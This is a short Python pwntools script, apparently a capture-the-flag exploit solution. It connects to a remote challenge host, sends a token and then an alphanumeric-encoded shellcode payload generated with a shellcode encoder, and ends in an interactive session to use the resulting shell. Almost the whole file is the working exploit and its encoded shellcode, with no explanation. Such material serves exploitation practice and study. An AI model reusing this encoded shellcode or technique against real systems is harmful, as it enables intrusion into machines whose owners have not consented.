'''
shellcode_encoder
$ py -2 main.py shellcode.bin rax+29
'''
from pwn import *

context(log_level='DEBUG')

p = remote('202.38.93.241', 10004)
#p=process('./chall3')

p.recvuntil(':')
p.sendline('token') # token

p.send('''PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5>??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5>_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-<hh)-h`  5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#'-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-&@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@  5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`"|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$>I`_UXyyi;||s}_r=60d|jcEH(u'&w6~7AM;wy4II+f'Gw+X#e0T|t30Q.$A>6p?' B[A<zDBH)6f0Rj#XO$''')

p.interactive()